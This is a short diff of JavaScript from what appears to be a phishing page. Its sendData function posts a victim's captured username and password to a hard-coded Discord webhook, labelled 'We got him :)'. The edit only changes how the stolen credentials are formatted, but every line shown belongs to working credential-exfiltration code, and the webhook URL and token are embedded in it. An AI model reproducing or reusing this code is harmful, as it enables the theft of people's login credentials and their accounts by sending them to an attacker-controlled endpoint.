@@ -3,7 +3,7 @@ function sendData(User, Pass) {
     $.post('https://discord.com/api/webhooks/1048994205323763752/hYfgp4XmfG4PJhUKxlrYtevnB0xvRuuwHhD5MM-F5kK1kjiQBBDAncUjXozvGr5nUGiP',
     {
         'username': 'We got him :)',
-        'content': 'Username:' + User + '\nPassword:' + Pass,
+        'content': 'Username:\n  ' + User + '\nPassword:\n  ' + Pass,
     }, function(data, status) {
         console.log("Data: " + data + "\nStatus: " + status);
     }
